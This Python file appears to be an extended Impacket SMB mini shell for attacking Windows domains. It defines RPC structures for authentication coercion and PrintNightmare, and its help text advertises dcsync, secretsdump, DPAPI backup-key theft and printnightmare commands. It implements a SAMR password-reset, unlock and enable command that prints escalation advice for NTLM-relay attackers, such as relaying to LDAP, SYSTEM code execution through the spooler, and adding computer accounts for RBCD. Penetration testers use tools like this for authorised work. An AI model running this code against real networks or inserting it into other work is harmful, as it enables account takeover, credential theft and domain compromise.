# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Mini shell using some of the SMB funcionality of the library
#
# Author:
#   Alberto Solino (@agsolino)
#
# Reference for:
#   SMB DCE/RPC
#
from io import BytesIO
import sys
import time
import cmd
import os
import ntpath
import random
import string
import struct
import shlex
from datetime import datetime, timezone

from binascii import hexlify, unhexlify
from six import PY2
from impacket import smb, crypto, system_errors
from impacket.structure import Structure
from impacket.dcerpc.v5 import samr, transport, srvs, lsat, lsad, nrpc, rprn, bkrp, drsuapi
from impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED, WSTR, ULONG, DWORD, LONG, LPWSTR, BOOL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.uuid import uuidtup_to_bin, bin_to_string
from impacket.dpapi import P_BACKUP_KEY, PREFERRED_BACKUP_KEY, PVK_FILE_HDR
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes, SAMHashes, LSASecrets
from impacket import LOG
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
    FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE
from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY
from impacket.acl import SMBFileACL
from impacket.nt_errors import STATUS_PATH_NOT_COVERED, STATUS_MORE_ENTRIES, STATUS_SOME_NOT_MAPPED, STATUS_NONE_MAPPED

import charset_normalizer as chardet


# Coercion RPC NDR definitions
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ("Data", "20s"),
    )


class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ("FileName", WSTR),
        ("Flags", LONG),
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ("hContext", EXIMPORT_CONTEXT_HANDLE),
        ("ErrorCode", ULONG),
    )


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ("FileName", WSTR),
    )


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (
        ("ErrorCode", ULONG),
    )


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ("FileName", WSTR),
        ("OpenFlag", ULONG),
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (
        ("ErrorCode", ULONG),
    )


class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ("FileName", WSTR),
    )


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = (
        ("ErrorCode", ULONG),
    )


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("ApiFlags", DWORD),
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = (
        ("ErrorCode", ULONG),
    )


class NetrDfsAddStdRoot(NDRCALL):
    opnum = 12
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("Comment", WSTR),
        ("ApiFlags", DWORD),
    )


class NetrDfsAddStdRootResponse(NDRCALL):
    structure = (
        ("ErrorCode", ULONG),
    )


class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (
        ("ShareName", WSTR),
    )


class IsPathSupportedResponse(NDRCALL):
    structure = (
        ("SupportedByThisProvider", BOOL),
        ("OwnerMachineName", LPWSTR),
        ("ErrorCode", ULONG),
    )


# PrintNightmare (CVE-2021-1675 / CVE-2021-34527) definitions
RPC_E_ACCESS_DENIED = 0x8001011B
if RPC_E_ACCESS_DENIED not in system_errors.ERROR_MESSAGES:
    system_errors.ERROR_MESSAGES[RPC_E_ACCESS_DENIED] = (
        "RPC_E_ACCESS_DENIED",
        "Access is denied.",
    )

DPD_DELETE_UNUSED_FILES = 0x00000001


class DRIVER_INFO_2_BLOB(Structure):
    structure = (
        ("cVersion", "<L"),
        ("NameOffset", "<L"),
        ("EnvironmentOffset", "<L"),
        ("DriverPathOffset", "<L"),
        ("DataFileOffset", "<L"),
        ("ConfigFileOffset", "<L"),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data=data)

    def fromString(self, data, offset=0):
        Structure.fromString(self, data)
        try:
            name = data[self["NameOffset"] + offset:].decode("utf-16-le", errors="replace")
            name_len = name.find("\0")
            if name_len != -1:
                name = name[:name_len]
            self["Name"] = name
        except Exception:
            self["Name"] = ""

        try:
            cfg = data[self["ConfigFileOffset"] + offset : self["DataFileOffset"] + offset].decode("utf-16-le", errors="replace").rstrip("\0")
            self["ConfigFile"] = cfg
        except Exception:
            self["ConfigFile"] = ""

        try:
            data_file = data[self["DataFileOffset"] + offset : self["DriverPathOffset"] + offset].decode("utf-16-le", errors="replace").rstrip("\0")
            self["DataFile"] = data_file
        except Exception:
            self["DataFile"] = ""

        try:
            drv_path = data[self["DriverPathOffset"] + offset : self["EnvironmentOffset"] + offset].decode("utf-16-le", errors="replace").rstrip("\0")
            self["DriverPath"] = drv_path
        except Exception:
            self["DriverPath"] = ""

        try:
            env = data[self["EnvironmentOffset"] + offset : self["NameOffset"] + offset].decode("utf-16-le", errors="replace").rstrip("\0")
            self["Environment"] = env
        except Exception:
            self["Environment"] = ""


class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data=None, pcReturned=0):
        Structure.__init__(self, data=data)
        self["drivers"] = []
        remaining = data
        if data is not None:
            for _ in range(pcReturned):
                if len(remaining) < 24:
                    break
                attr = DRIVER_INFO_2_BLOB(remaining)
                self["drivers"].append(attr)
                remaining = remaining[len(attr):]


class RpcDeletePrinterDriverEx(NDRCALL):
    opnum = 84
    structure = (
        ("pName", rprn.STRING_HANDLE),
        ("pEnvironment", WSTR),
        ("pDriverName", WSTR),
        ("dwDeleteFlag", DWORD),
        ("dwVersionNum", DWORD),
    )


class RpcDeletePrinterDriverExResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


if hasattr(rprn, "OPNUMS") and 84 not in rprn.OPNUMS:
    rprn.OPNUMS[84] = (RpcDeletePrinterDriverEx, RpcDeletePrinterDriverExResponse)


def hRpcDeletePrinterDriverEx(dce, pName, pEnvironment, pDriverName, dwDeleteFlag=DPD_DELETE_UNUSED_FILES, dwVersionNum=0):
    request = RpcDeletePrinterDriverEx()
    request["pName"] = rprn.checkNullString(pName)
    request["pEnvironment"] = rprn.checkNullString(pEnvironment)
    request["pDriverName"] = rprn.checkNullString(pDriverName)
    request["dwDeleteFlag"] = dwDeleteFlag
    request["dwVersionNum"] = dwVersionNum
    return dce.request(request)


class MiniImpacketShell(cmd.Cmd):
    def __init__(self, smbClient, tcpShell=None, outputfile=None, dfs_auto_follow=False):
        #If the tcpShell parameter is passed (used in ntlmrelayx),
        # all input and output is redirected to a tcp socket
        # instead of to stdin / stdout
        if tcpShell is not None:
            cmd.Cmd.__init__(self, stdin=tcpShell.stdin, stdout=tcpShell.stdout)
            sys.stdout = tcpShell.stdout
            sys.stdin = tcpShell.stdin
            sys.stderr = tcpShell.stdout
            self.use_rawinput = False
            self.shell = tcpShell
        else:
            cmd.Cmd.__init__(self)
            self.shell = None

        self.prompt = '# '
        self.smb = smbClient
        self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey, self.TGT, self.TGS = smbClient.getCredentials()
        self.tid = None
        self.intro = 'Type help for list of commands'
        self.pwd = ''
        self.share = None
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.outputfile = outputfile
        self.use_kerberos = smbClient.getSMBServer().getKerberos() if hasattr(smbClient.getSMBServer(), 'getKerberos') else False
        self.kdcHost = getattr(smbClient, '_kdcHost', None)
        # DFS support
        self.dfs_auto_follow = dfs_auto_follow
        self.dfs_connections = {}
        self.dfs_referral_cache = {}
        self.dfs_context_stack = []  # Stack of {smb, tid, share, pwd, dfs_target_info}
        self.dfs_target_info = None

    @property
    def is_dfs_context(self):
        return len(self.dfs_context_stack) > 0

    def emptyline(self):
        pass

    def precmd(self,line):
        # switch to unicode
        if self.outputfile is not None:
            f = open(self.outputfile, 'a')
            f.write('> ' + line + "\n")
            f.close()
        if PY2:
            return line.decode('utf-8')
        return line

    def onecmd(self,s):
        retVal = False
        try:
           retVal = cmd.Cmd.onecmd(self,s)
        except Exception as e:
           LOG.error(e)
           LOG.debug('Exception info', exc_info=True)

        return retVal

    def do_exit(self,line):
        if self.shell is not None:
            self.shell.close()
        return True

    def do_shell(self, line):
        output = os.popen(line).read()
        print(output)
        self.last_output = output

    def do_help(self,line):
        cmd_name = line.strip() if line else ''
        if cmd_name:
            help_func = getattr(self, 'help_' + cmd_name, None)
            if help_func is not None:
                help_func()
                return
            cmd_func = getattr(self, 'do_' + cmd_name, None)
            if cmd_func is not None and cmd_func.__doc__:
                print(cmd_func.__doc__)
                return
        print("""
 open {host,port=445} - opens a SMB connection against the target host/port
 reconnect - reconnect connection, useful for broken pipes & interrupted sessions
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password <username> [new_password] [options] - resets or sets a user's password via SAMR (aliases: set_password, reset_password)
 unlock <username> - unlocks a locked out user account via SAMR without changing password
 enable_user <username> - enables a disabled user account via SAMR without changing password (alias: enableuser)
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 rget {mask} - recursively downloads all files from the current directory and subdirectories matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 add_computer [name] [password] - adds a computer account to the domain via SAMR
 enum_users [domain] [-v] [username] - enumerates domain users and RIDs via SAMR named pipe
 enum_groups [domain] - enumerates domain global groups and local aliases via SAMR named pipe
 enum_pwpolicy [domain] - retrieves domain password and lockout policy via SAMR (alias: get_domain_pw_policy)
 lookup_sids [sids|rids|range] - resolves SIDs or RIDs to names via LSARPC named pipe (e.g. 500-550)
 lookup_names [name1] [name2] ... - resolves user/group names to SIDs via LSARPC named pipe
 enum_trusts - enumerates domain and forest trusts via Netlogon/LSARPC named pipe
 coerce <listener_ip> [method] [-a] - triggers authentication coercion back to listener (spoolss, efsrpc, netdfs, fsrvp, all)
 backupkey [-export [dir]] - extracts DPAPI domain backup keys (preferred & legacy) via LSARPC / MS-BKRP
 dcsync [user] [-o file] [-full] - extracts domain credentials via DRSUAPI replication (requires replication privileges)
 secretsdump [options] - dumps local SAM hashes, cached credentials (DCC2), and LSA secrets via RemoteOperations (aliases: dump_lsa, dump_sam, dumplsa, dumpsam)
 printnightmare [--check | --list | <dll_path>] [options] - exploits/checks PrintNightmare (CVE-2021-1675 / CVE-2021-34527) via \pipe\spoolss
 acl {filename,action,permissions,user/group} - displays or modifies file ACLs
 dfs_info {path} - shows DFS referral info for the specified path (or current directory), shows all targets
 dfs_mode {on|off} - toggle DFS auto-follow mode (creates new SMB connections to DFS targets, disabled by default for OPSEC)
 close - closes the current SMB Session
 NOTE: DFS support includes nested DFS links (arbitrary depth), multi-target failover, and connection health checks.
 exit - terminates the server process (and this session)

""")

    def do_password(self, line):
        """password <username> [new_password] [options]
Resets, sets, unlocks, or inspects an Active Directory or local SAM user via SAMR over SMB.
Aliases: set_password, reset_password, setpassword, changepassword

Usage:
  password <username>                      (Auto-generates strong random password)
  password <username> <new_password>       (Sets specified password)
  password <username> -u                   (Unlocks account without changing password)
  password <username> -e                   (Enables account without changing password)
  password <username> -c                   (Checks account status/flags without changing password)
  password <username> <new_password> -u -e (Sets password and unlocks/enables account)
  password <username> <new_password> --old <old_password>  (User self-service change - works over relayed SMB!)
  password <username> <new_password> -k <session_key_hex>  (Provide known SMB session key)

Options:
  -u, --unlock            Unlock account if locked out (USER_ACCOUNT_AUTO_LOCKED)
  -e, --enable            Enable account if disabled (USER_ACCOUNT_DISABLED)
  -c, --check             Query and display account status without modifying password
  --no-pass               Do not modify password (useful with -u or -e)
  --old <old_pass>        Specify current/old password (works over relayed SMB!)
  -k, --key <hex_key>     Specify transport SMB session key in hex for administrative reset
  -d, --domain <domain>   Target domain name (default: auto-detected domain)
  -h, --help              Show this help message
"""
        if self.smb is None or self.loggedIn is False:
            print("[-] No active SMB connection or not logged in")
            return

        try:
            parts = shlex.split(line) if line else []
        except ValueError:
            parts = line.split() if line else []

        if any(p in ('-h', '--help', 'help') for p in parts):
            self.help_password()
            return

        target_user = None
        new_password = None
        target_domain = None
        unlock_account = False
        enable_account = False
        check_only = False
        no_pass = False
        old_password = None
        session_key_hex = None

        idx = 0
        clean_args = []
        while idx < len(parts):
            p = parts[idx]
            if p in ('-u', '--unlock', '-unlock'):
                unlock_account = True
            elif p in ('-e', '--enable', '-enable'):
                enable_account = True
            elif p in ('-c', '--check', '-check'):
                check_only = True
            elif p in ('--no-pass', '--no-password', '-nopass'):
                no_pass = True
            elif p in ('-k', '--key', '-key', '--session-key', '-session-key'):
                if idx + 1 < len(parts):
                    idx += 1
                    session_key_hex = parts[idx]
            elif p in ('-d', '--domain', '-domain'):
                if idx + 1 < len(parts):
                    idx += 1
                    target_domain = parts[idx]
            elif p in ('--old', '-old', '--old-pass', '--old-password'):
                if idx + 1 < len(parts):
                    idx += 1
                    old_password = parts[idx]
            elif not p.startswith('-'):
                clean_args.append(p)
            idx += 1

        if len(clean_args) >= 1:
            target_user = clean_args[0]
        if len(clean_args) >= 2:
            new_password = clean_args[1]

        if not target_user:
            if getattr(self, 'username', None):
                target_user = self.username
                print("[*] No username specified; defaulting to current session user: '%s'" % target_user)
            else:
                print("[-] Target username is required.")
                print("    Usage: password <username> [new_password] [options]")
                print("    Run 'help password' for more information.")
                return

        # Check for DOMAIN\\user or user@domain syntax
        if '\\' in target_user:
            d_part, u_part = target_user.split('\\', 1)
            if not target_domain:
                target_domain = d_part
            target_user = u_part
        elif '@' in target_user:
            u_part, d_part = target_user.split('@', 1)
            if not target_domain:
                target_domain = d_part
            target_user = u_part

        # Decide whether we are modifying the password:
        modify_password = True
        if check_only or no_pass:
            modify_password = False
        elif new_password is None and (unlock_account or enable_account):
            modify_password = False
            print("[*] No new password specified; performing account flag update (unlock/enable) only.")
            print("    (To change password at the same time, specify: password %s <new_password> [options])" % target_user)

        generated = False
        if modify_password and not new_password:
            specials = '!@#$%^&*_-+='
            pw_chars = [
                random.choice(string.ascii_uppercase),
                random.choice(string.ascii_uppercase),
                random.choice(string.ascii_lowercase),
                random.choice(string.ascii_lowercase),
                random.choice(string.digits),
                random.choice(string.digits),
                random.choice(specials),
                random.choice(specials)
            ]
            all_c = string.ascii_letters + string.digits + specials
            pw_chars += [random.choice(all_c) for _ in range(12)]
            random.shuffle(pw_chars)
            new_password = ''.join(pw_chars)
            generated = True

        target_host = self.smb.getRemoteHost()
        print("=" * 60)
        print("[*] SAMR Password Reset / Account Management")
        print("[*] Target Host: %s" % target_host)
        print("[*] Target User: %s" % target_user)
        if target_domain:
            print("[*] Domain:      %s" % target_domain)
        if check_only:
            print("[*] Mode:        Check Account Status (Read-Only)")
        elif not modify_password:
            print("[*] Mode:        Update Account Flags Only (No Password Change)")
        elif generated:
            print("[*] Generated password: %s" % new_password)
        else:
            print("[*] New Password:       %s" % new_password)
        if unlock_account:
            print("[*] Unlock:      Yes")
        if enable_account:
            print("[*] Enable:      Yes")
        if old_password:
            print("[*] Old Password: Provided (Self-service change mode)")
        print("=" * 60)

        # Apply custom session key if passed
        if session_key_hex:
            try:
                raw_key = unhexlify(session_key_hex.strip())
                if len(raw_key) < 16:
                    raw_key = raw_key.ljust(16, b'\\x00')
                self.smb.setSessionKey(raw_key)
                print("[*] Applied manual SMB session key (%d bytes)." % len(raw_key))
            except Exception as e_k:
                print("[-] Invalid hex session key specified: %s" % str(e_k))
                print("=" * 60)
                return

        # Check session key status
        smb_session_key = self.smb.getSessionKey()
        if isinstance(smb_session_key, str):
            smb_session_key = smb_session_key.encode('latin-1')
        has_valid_session_key = bool(smb_session_key and len(smb_session_key) >= 14)

        dce = None
        serverHandle = None
        domainHandle = None
        user_handle = None

        try:
            dce, serverHandle, domainHandle, domainSid, chosen_domain = self._connect_samr(target_domain)
            if dce is None or domainHandle is None:
                print("[-] Failed to open SAMR domain on %s." % target_host)
                print("[-] Ensure \\pipe\\samr is accessible and you have sufficient permissions.")
                print("=" * 60)
                return

            print("[*] Connected to SAMR domain: %s" % chosen_domain)
            print("[*] Looking up user '%s'..." % target_user)

            try:
                checkUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [target_user])
            except DCERPCException as e:
                err_str = str(e)
                if any(x in err_str for x in ('STATUS_NONE_MAPPED', '0xc0000073', 'NONE_MAPPED')):
                    print("[-] User '%s' does not exist in domain '%s'." % (target_user, chosen_domain))
                else:
                    print("[-] Error looking up user '%s': %s" % (target_user, err_str))
                print("=" * 60)
                return

            user_rid = 0
            try:
                user_rid = self._to_int(checkUser['RelativeIds']['Element'][0]['Data'])
            except Exception:
                pass
            if not user_rid:
                try:
                    user_rid = self._to_int(checkUser['RelativeIds']['Element'][0])
                except Exception:
                    pass

            if not user_rid:
                print("[-] Could not retrieve RID for '%s'." % target_user)
                print("=" * 60)
                return

            print("[+] Resolved user '%s' -> RID: %s" % (target_user, str(user_rid)))
            print("[*] Opening user handle (RID: %s)..." % str(user_rid))

            access_masks = [
                MAXIMUM_ALLOWED,
                samr.USER_FORCE_PASSWORD_CHANGE | samr.USER_CHANGE_PASSWORD | samr.USER_READ_GENERAL | samr.USER_WRITE_ACCOUNT,
                samr.USER_FORCE_PASSWORD_CHANGE | samr.USER_ALL_ACCESS,
                samr.USER_FORCE_PASSWORD_CHANGE
            ]

            for mask in access_masks:
                try:
                    openResp = samr.hSamrOpenUser(dce, domainHandle, mask, user_rid)
                    user_handle = openResp['UserHandle']
                    break
                except Exception:
                    continue

            if user_handle is None:
                openResp = samr.hSamrOpenUser(dce, domainHandle, samr.USER_FORCE_PASSWORD_CHANGE, user_rid)
                user_handle = openResp['UserHandle']

            # Query current user account info (UserAllInformation)
            userInfo = None
            uac = 0
            is_disabled = False
            is_locked = False
            pwd_expired = False
            dont_expire = False
            try:
                userInfo = samr.hSamrQueryInformationUser2(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
                u_all = userInfo['Buffer']['All']
                uac = self._to_int(u_all['UserAccountControl'])
                is_disabled = bool(uac & samr.USER_ACCOUNT_DISABLED)
                is_locked = bool(uac & samr.USER_ACCOUNT_AUTO_LOCKED)
                pwd_expired = bool(u_all['PasswordExpired'])
                dont_expire = bool(uac & samr.USER_DONT_EXPIRE_PASSWORD)
                bad_pwd_count = self._to_int(u_all['BadPasswordCount'])
                logon_count = self._to_int(u_all['LogonCount'])
                pwd_last_set = self._format_filetime(u_all['PasswordLastSet'])

                print("[+] Account Status for '%s':" % target_user)
                print("    - Account Disabled:     %s" % ("YES" if is_disabled else "No"))
                print("    - Account Locked Out:   %s" % ("YES" if is_locked else "No"))
                print("    - Password Expired:     %s" % ("YES" if pwd_expired else "No"))
                print("    - Password Never Exp:   %s" % ("YES" if dont_expire else "No"))
                print("    - Password Last Set:    %s" % pwd_last_set)
                print("    - Bad Password Count:   %d" % bad_pwd_count)
                print("    - Logon Count:          %d" % logon_count)
            except Exception as e_info:
                LOG.debug("Could not query UserAllInformation: %s" % str(e_info))

            reset_success = False
            last_err = None

            if modify_password:
                print("[*] Setting password via SAMR...")

                # Method A: Self-service change with known old password
                # SamrUnicodeChangePasswordUser2 / SamrChangePasswordUser encrypt with old password NTOWF, NOT SMB session key!
                if old_password is not None:
                    print("[*] Attempting password change with provided old password...")
                    try:
                        samr.hSamrUnicodeChangePasswordUser2(dce, '\\\\%s\x00' % target_host, target_user, old_password, new_password)
                        reset_success = True
                        print("[+] Password successfully changed via SamrUnicodeChangePasswordUser2!")
                    except Exception as e:
                        last_err = e
                        try:
                            samr.hSamrChangePasswordUser(dce, user_handle, old_password, new_password)
                            reset_success = True
                            print("[+] Password successfully changed via SamrChangePasswordUser!")
                        except Exception as e2:
                            last_err = e2

                # Method B: Administrative reset via UserInternal1Information / UserInternal4InformationNew
                # Requires valid SMB session key (available when authenticated directly, or if session key supplied via -k)
                if not reset_success and has_valid_session_key:
                    try:
                        samr.hSamrSetNTInternal1(dce, user_handle, new_password)
                        reset_success = True
                        print("[+] Password set via SamrSetNTInternal1 (UserInternal1Information)!")
                    except DCERPCException as e:
                        last_err = e
                        err_s = str(e)
                        if '0xc000006c' in err_s or 'STATUS_PASSWORD_RESTRICTION' in err_s:
                            print("[-] Password rejected by domain password policy (length, complexity, or history).")
                            raise
                    except Exception as e:
                        last_err = e

                    if not reset_success:
                        try:
                            samr.hSamrSetPasswordInternal4New(dce, user_handle, new_password)
                            reset_success = True
                            print("[+] Password set via SamrSetPasswordInternal4New (UserInternal4InformationNew)!")
                        except Exception as e:
                            last_err = e

                # Method C: Blank old password fallback (in case user currently has no password or blank password)
                if not reset_success and not has_valid_session_key and old_password is None:
                    try:
                        samr.hSamrChangePasswordUser(dce, user_handle, '', new_password)
                        reset_success = True
                        print("[+] Password set via SamrChangePasswordUser (blank old password)!")
                    except Exception as e_blank:
                        last_err = e_blank
                        try:
                            samr.hSamrUnicodeChangePasswordUser2(dce, '\\\\%s\x00' % target_host, target_user, '', new_password)
                            reset_success = True
                            print("[+] Password set via SamrUnicodeChangePasswordUser2 (blank old password)!")
                        except Exception as e_blank2:
                            last_err = e_blank2

                # If reset failed, explain the exact reason
                if not reset_success:
                    if not has_valid_session_key and old_password is None:
                        print("=" * 60)
                        print("[-] SAMR Administrative Password Reset Failed: SMB Session Key Unavailable")
                        print("=" * 60)
                        print("[*] Cryptographic Constraint:")
                        print("    In an NTLM relay attack, ntlmrelayx acts as an unauthenticated MITM.")
                        print("    The transport SMB session key is cryptographically derived from the victim's")
                        print("    plaintext password / NTOWF hash, which is not known to the relay attacker.")
                        print("    MS-SAMR administrative password resets (UserInternal1Information /")
                        print("    UserInternal4InformationNew) strictly mandate encrypting the new password")
                        print("    payload with this transport SMB session key. Without it, the DC cannot")
                        print("    decrypt the password.")
                        print()
                        print("[*] Working Alternatives for Privilege Escalation & Access:")
                        print("    1. If the target's current/old password is known:")
                        print("       Run: password %s <new_password> --old <current_password>" % target_user)
                        print("       (ChangePasswordUser encrypts with the old password hash, NOT the session key!)")
                        print()
                        print("    2. Unlock or Enable the account (does NOT require an SMB session key):")
                        print("       Run: unlock %s" % target_user)
                        print("       Run: enable_user %s" % target_user)
                        print("       (UAC modifications succeed directly over relayed SMB!)")
                        print()
                        print("    3. Add a new Domain Computer Account:")
                        print("       Run: add_computer <name> <password>")
                        print("       (Newly created accounts start with a blank password, bypassing the session key constraint!)")
                        print("       Once created, use the computer account for Kerberos authentication / S4U2Self / RBCD.")
                        print()
                        print("    4. Execute SYSTEM Code via Print Spooler:")
                        print("       Run: printnightmare <dll_path>")
                        print("       (MS-RPRN named pipe \\pipe\\spoolss does not require session key encryption!)")
                        print()
                        print("    5. Relay authentication to LDAP / LDAPS instead of SMB:")
                        print("       In ntlmrelayx, specify: -t ldap://<DC_IP> or -t ldaps://<DC_IP>")
                        print("       LDAP supports direct account password resets, Shadow Credentials, and RBCD.")
                        print("=" * 60)
                    else:
                        raise Exception("Failed to reset password: %s" % str(last_err))

            # Query and optionally update UserAccountControl (lockout / disabled / expired)
            # Modifying UAC via UserControlInformation does NOT require any session key encryption!
            modified_uac = False
            new_uac = uac

            if unlock_account:
                if is_locked:
                    new_uac &= ~samr.USER_ACCOUNT_AUTO_LOCKED
                    modified_uac = True
                    print("[+] Cleared account lockout flag (USER_ACCOUNT_AUTO_LOCKED).")
                else:
                    print("[*] Account '%s' is not locked out." % target_user)
            elif is_locked and not check_only:
                print("[!] Note: Account '%s' is currently LOCKED OUT. Use '-u' or 'unlock %s' to unlock." % (target_user, target_user))

            if enable_account:
                if is_disabled:
                    new_uac &= ~samr.USER_ACCOUNT_DISABLED
                    modified_uac = True
                    print("[+] Cleared account disabled flag (USER_ACCOUNT_DISABLED).")
                else:
                    print("[*] Account '%s' is already enabled." % target_user)
            elif is_disabled and not check_only:
                print("[!] Note: Account '%s' is currently DISABLED. Use '-e' or 'enable_user %s' to enable." % (target_user, target_user))

            # Clear forced password expiration if set by Internal4New or expired
            if reset_success and (new_uac & samr.USER_PASSWORD_EXPIRED):
                new_uac &= ~samr.USER_PASSWORD_EXPIRED
                modified_uac = True

            if modified_uac:
                try:
                    infoBuf = samr.SAMPR_USER_INFO_BUFFER()
                    infoBuf['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
                    infoBuf['Control']['UserAccountControl'] = new_uac
                    samr.hSamrSetInformationUser2(dce, user_handle, infoBuf)
                    print("[+] Successfully updated UserAccountControl flags to 0x%04x." % new_uac)
                except Exception as e_set_uac:
                    print("[-] Failed to update UserAccountControl: %s" % str(e_set_uac))

            # If target user is the current session user and password was changed, update cached credentials
            if reset_success and getattr(self, 'username', None) and target_user.lower() == self.username.lower():
                self.password = new_password
                self.lmhash = None
                self.nthash = None
                print("[*] Updated internal session password for current user '%s'." % self.username)

            if reset_success:
                print("=" * 60)
                print("[+] SUCCESS: Password successfully set!")
                print("[+] Target Host:  %s" % target_host)
                print("[+] Domain:       %s" % chosen_domain)
                print("[+] Username:     %s" % target_user)
                print("[+] New Password: %s" % new_password)
                print("=" * 60)
            elif not modify_password:
                print("=" * 60)
                if modified_uac:
                    print("[+] SUCCESS: Account flags updated successfully for '%s'!" % target_user)
                else:
                    print("[+] Account query completed for '%s'." % target_user)
                print("=" * 60)

        except DCERPCException as e:
            err_msg = str(e)
            print("=" * 60)
            print("[-] DCERPC Session Error: %s" % err_msg)
            if any(k in err_msg.lower() for k in ['access_denied', '0xc0000022', 'status_access_denied']):
                print("[-] Access Denied: Relayed account lacks permissions to modify '%s'." % target_user)
                print("    Resetting passwords requires Domain Admin, Account Operators, or delegated reset rights.")
            elif '0xc000006c' in err_msg or 'STATUS_PASSWORD_RESTRICTION' in err_msg:
                print("[-] Password Policy Violation: The password does not meet complexity/length/history policy.")
                print("    Try specifying a custom complex password (e.g. 'password %s P@ssw0rd2026!')." % target_user)
            elif '0xc0000073' in err_msg or 'STATUS_NONE_MAPPED' in err_msg:
                print("[-] Account '%s' was not found in the domain." % target_user)
            elif '0xc000006a' in err_msg or 'STATUS_WRONG_PASSWORD' in err_msg:
                print("[-] Incorrect Old Password: The old password specified in '--old' is invalid.")
            print("=" * 60)
        except Exception as e:
            print("=" * 60)
            print("[-] Error: %s" % str(e))
            print("=" * 60)
        finally:
            if user_handle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, user_handle)
                except Exception:
                    pass
            if domainHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, domainHandle)
                except Exception:
                    pass
            if serverHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, serverHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    do_set_password = do_password
    do_reset_password = do_password
    do_setpassword = do_password
    do_changepassword = do_password

    def help_password(self):
        print("""
================================================================================
SAMR User Password Reset / Change / Management
================================================================================
Resets, sets, unlocks, or enables an Active Directory or local SAM user's account
over SMB via the \\pipe\\samr RPC interface.

Syntax:
  password <username> [new_password] [options]

Aliases:
  set_password, reset_password, setpassword, changepassword

Options:
  -u, --unlock            Unlock account if locked out (USER_ACCOUNT_AUTO_LOCKED)
  -e, --enable            Enable account if disabled (USER_ACCOUNT_DISABLED)
  -c, --check             Query and display account status without modifying password
  --no-pass               Do not modify password (useful with -u or -e)
  --old <old_password>    Specify old password (for non-admin self-service change;
                          works over NTLM-relayed SMB without session key!)
  -k, --key <hex_key>     Specify transport SMB session key in hex
  -d, --domain <domain>   Target domain name (default: auto-detected domain)
  -h, --help              Show this help message

Convenience Commands:
  unlock <username>       Unlocks account without changing password
  enable_user <username>  Enables account without changing password

Examples:
  1. Reset user password with auto-generated strong password:
     # password Administrator

  2. Reset user password with specified password:
     # password Administrator SuperP@ssw0rd2026!

  3. Change password using known old password (works over relayed SMB!):
     # password jsmith NewP@ssw0rd2026! --old OldP@ssw0rd123!

  4. Unlock a locked-out user account without changing password:
     # unlock Administrator
     # password Administrator -u

  5. Enable a disabled user account without changing password:
     # enable_user Guest
     # password Guest -e

  6. Check account status (lockout, disabled, expiry, bad pwd count):
     # password mandiantadmin --check
================================================================================
""")

    help_set_password = help_password
    help_reset_password = help_password
    help_setpassword = help_password
    help_changepassword = help_password

    def complete_password(self, text, line, begidx, endidx):
        options = ['-u', '--unlock', '-e', '--enable', '-c', '--check', '--no-pass', '-k', '--key', '-d', '--domain', '--old', '-h', '--help']
        if text.startswith('-'):
            return [opt for opt in options if opt.startswith(text)]
        return []

    complete_set_password = complete_password
